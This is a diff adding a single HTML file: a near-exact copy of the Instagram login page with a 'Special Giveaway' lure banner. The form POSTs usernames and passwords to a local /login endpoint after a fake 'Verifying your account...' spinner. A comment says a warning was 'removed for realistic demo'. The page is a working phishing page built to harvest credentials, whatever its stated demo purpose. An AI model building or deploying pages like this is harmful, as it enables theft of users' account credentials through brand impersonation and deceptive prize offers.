@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .phone-container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 44px;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiPjxwYXRoIGZpbGw9IiMyNjI2MjYiIGQ9Ik0xMzUuNSAyNC41YzAtNy40IDYtMTMuNSAxMy41LTEzLjUgNy40IDAgMTMuNSA2IDEzLjUgMTMuNXMtNiAxMy41LTEzLjUgMTMuNWMtNy41IDAtMTMuNS02LTEzLjUtMTMuNXptMTkuOCAwYzAtMy41LTIuOC02LjMtNi4zLTYuM3MtNi4zIDIuOC02LjMgNi4zIDIuOCA2LjMgNi4zIDYuMyA2LjMtMi44IDYuMy02LjN6bS0zNS40LTEyLjd2MjQuNWgtNy4xVjI1LjljMC0zLjQtMS4yLTUuMS0zLjctNS4xLTIuMSAwLTMuMyAxLjQtMy45IDIuN3YxNC44aC03LjFWMTEuOGg2Ljh2My4xYzEuNC0yLjMgMy45LTMuNiA3LTMuNiA1LjQgMCA4IDMuNSA4IDguNXptLTI4LjYtMS4zYy0yLjIgMC00LjEgMS4xLTUuMyAyLjl2MTQuOWgtNy4xVjExLjhoNi44djMuMmMxLjYtMi40IDQuMS0zLjcgNy4xLTMuN3YuNWMwIDIuNC0uMyAzLjctLjUgMy43LS4zIDAtLjcgMC0xIDB6bS0xNi45IDguMWMwIDMuOSAyLjIgNi4xIDUuNCA2LjEgMS44IDAgMy40LS43IDQuNi0xLjlsNC4yIDQuNGMtMi4yIDIuNS01LjQgNC02LjEgNGgtLjJjLTcuMyAwLTEyLjctNS41LTEyLjctMTMuNVM4Mi44IDExIDkwIDExYzcuMyAwIDEyLjcgNS41IDEyLjcgMTMuNXYuMWgtMTcuNHptMTAuNC01LjVjLS4zLTMuNi0yLjQtNS43LTUuNC01LjctMyAwLTUuMSAyLjEtNS40IDUuN2gxMC44em0tMjkuNyAxLjRjMC03LjQgNi4xLTEzLjUgMTMuNS0xMy41IDUuMSAwIDkuNCAyLjggMTEuOCA3LjFsLTYuMyAzLjZjLTEuMi0yLjQtMy42LTMuOS02LjQtMy45LTQuMSAwLTcuMyAzLjQtNy4zIDcuNnMzLjIgNy42IDcuMyA3LjZjMi44IDAgNS4yLTEuNSA2LjQtMy45bDYuMyAzLjZjLTIuNCA0LjMtNi43IDcuMS0xMS44IDcuMS03LjQgMC0xMy41LTYuMS0xMy41LTEzLjV6TTI0LjYgMTEuOGg3LjF2MjQuNWgtNy4xVjMzYy0xLjYgMi40LTQuMSAzLjctNy4xIDMuNy01LjYgMC0xMC4xLTQuNS0xMC4xLTEwLjFWMTEuOGg3LjF2MTQuOGMwIDMuNSAxLjIgNS4xIDMuNyA1LjEgMi4xIDAgMy4zLTEuNCAzLjktMi43VjExLjh6TTIzLjUgMGMwLTIuOCAxLjktNC44IDQuOC00LjhzNC44IDIgNC44IDQuOGMwIDIuOS0xLjkgNC44LTQuOCA0LjhzLTQuOC0xLjktNC44LTQuOHoiLz48L3N2Zz4=');
+            background-size: 175px 51px;
+            background-repeat: no-repeat;
+            background-position: center;
+            height: 51px;
+            margin: 0 auto 32px;
+        }
+
+        .promo-banner {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .promo-banner h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+
+        .promo-banner p {
+            font-size: 13px;
+            opacity: 0.95;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px 7px;
+            font-size: 12px;
+            margin-bottom: 6px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: #1877f2;
+        }
+
+        .login-button:active {
+            opacity: 0.7;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 12px;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 24px 40px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .warning {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #ff4444;
+            color: white;
+            padding: 5px;
+            text-align: center;
+            font-size: 11px;
+            opacity: 0.3;
+            z-index: 1000;
+        }
+
+        @media (max-width: 450px) {
+            .phone-container {
+                border: none;
+                background: transparent;
+                padding: 20px 0;
+            }
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            margin-top: 20px;
+            color: #262626;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Verifying your account...</div>
+    </div>
+
+    <div class="container">
+        <div class="phone-container">
+            <div class="logo"></div>
+            
+            <div class="promo-banner">
+                <h3>🎁 Special Giveaway!</h3>
+                <p>Login to claim your exclusive prize</p>
+            </div>
+            
+            <form action="/login" method="POST" id="loginForm">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
+                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            
+            <div class="divider">
+                <span>OR</span>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+    
+    <!-- Warning removed for realistic demo -->
+
+    <script>
+        // Show loading overlay and submit form
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const button = this.querySelector('.login-button');
+            button.textContent = 'Logging in...';
+            button.disabled = true;
+            
+            // Show loading overlay
+            document.getElementById('loadingOverlay').classList.add('active');
+            
+            // Submit the form after a realistic delay
+            setTimeout(() => {
+                this.submit();
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
